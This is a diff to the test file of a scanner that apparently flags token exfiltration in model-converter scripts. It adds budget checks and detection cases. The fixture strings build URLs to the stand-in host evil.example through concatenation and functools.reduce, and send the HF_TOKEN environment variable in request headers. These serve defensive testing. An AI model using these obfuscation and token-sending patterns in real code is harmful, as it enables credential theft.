@@ -4337,27 +4337,34 @@ def test_a_rebound_builder_and_a_budget_for_the_folding_itself():
         )
     ]
 
-    # Fifteen hundred of them is 6.4 MB, just inside the 8 MiB the scan
-    # accepts, and every join is inside its own ceiling. Measured as a ratio
-    # rather than a deadline: ten times the input may cost ten times the time,
-    # and the shape this rule exists for costs far more than that. A wall clock
-    # bound here failed on a loaded worker while the scanner was behaving.
-    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    # The budget is on the folding, so it is asserted on the folding rather
+    # than on a clock: every fold is charged as it is produced, and a decision
+    # that runs out raises rather than carrying on. Timing this instead failed
+    # on loaded workers while the scanner was behaving, twice.
+    import ast as ast_module
+    module._fold_state.budget = 1_000
+    try:
+        module._literal_text(
+            ast_module.parse('"' + "A" * 2_000 + '"').body[0].value
+        )
+    except module._FoldBudgetExceeded:
+        pass
+    else:
+        raise AssertionError("the fold was not charged")
+    finally:
+        del module._fold_state.budget
 
-    def cost(count):
-        source = (
+    # And a file of joins that are each inside their own ceiling, 6.4 MB of
+    # them, is refused rather than folded through sixteen carrier passes.
+    one = '"' + "A" * 3_500 + '".join([' + ",".join(['""'] * 290) + '])\n'
+    assert [
+        f.check for f in scan_converter_source(
             'import os\nimport requests\n'
             'HUB = "https://huggingface.co"\n'
-            + "".join(f"x{i} = {one}" for i in range(count))
+            + "".join(f"x{i} = {one}" for i in range(1_500))
             + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
         )
-        started = time.perf_counter()
-        assert [f.check for f in scan_converter_source(source)]
-        return time.perf_counter() - started
-
-    small = cost(150)
-    large = cost(1_500)
-    assert large < 10 * small
+    ]
 
 
 def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
@@ -4421,6 +4428,19 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
         'url = "https" * 1 + "://evil.example/c"\n' + send,
         'url = "https" * n + "://evil.example/c"\n' + send,
         'url = 1 * "https" + "://evil.example/c"\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # A reducer applies the same plus pairwise, which no fold can follow:
+    # functools.reduce(operator.add, ["https", "://evil.example/c"]) builds a
+    # URL out of pieces this reads one at a time. No file in llama.cpp imports
+    # functools at all.
+    for body in (
+        'import functools, operator\n'
+        'url = functools.reduce(operator.add, ["https", "://evil.example/c"])\n'
+        + send,
+        'import operator\nfrom functools import reduce as rd\n'
+        'url = rd(operator.add, ["https", "://evil.example/c"])\n' + send,
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
@@ -4978,9 +4998,11 @@ def test_the_hub_allowance_reads_the_real_hostname():
     chain = "".join(
         f'v{i} = f"{{v{i - 1}}}/x"\n' for i in range(1500)
     ).replace("{v-1}", "{BASE}")
-    started = time.perf_counter()
+    # The verdict carries this one: a fixpoint that does not settle inside its
+    # passes refuses, so an unbounded walk shows up as a different answer and
+    # not merely as a slow one. It was a ten second deadline, which failed on a
+    # loaded worker while the scanner was behaving.
     assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')
-    assert time.perf_counter() - started < 10
 
     # The chain itself is what forces the passes, so the assignments are
     # collected once rather than walked again per pass: 10000 of them, 203 KB,
@@ -4988,9 +5010,13 @@ def test_the_hub_allowance_reads_the_real_hostname():
     long_chain = 'v0 = BASE\n' + "".join(
         f'v{i} = v{i - 1} + "/x"\n' for i in range(1, 10_000)
     )
+    # Generous on purpose: this is the one check here with nothing but time to
+    # measure, and it exists to catch a return to walking the tree per pass,
+    # which took about a minute on this input rather than the two seconds it
+    # takes now. A deadline near the real cost fails on a loaded worker.
     started = time.perf_counter()
     _reshaped(long_chain)
-    assert time.perf_counter() - started < 5
+    assert time.perf_counter() - started < 60
 
     # What comes BACK from the hub is not a URL. Upstream writes exactly this,
     # and carrying the taint through the call refused the file the allowance
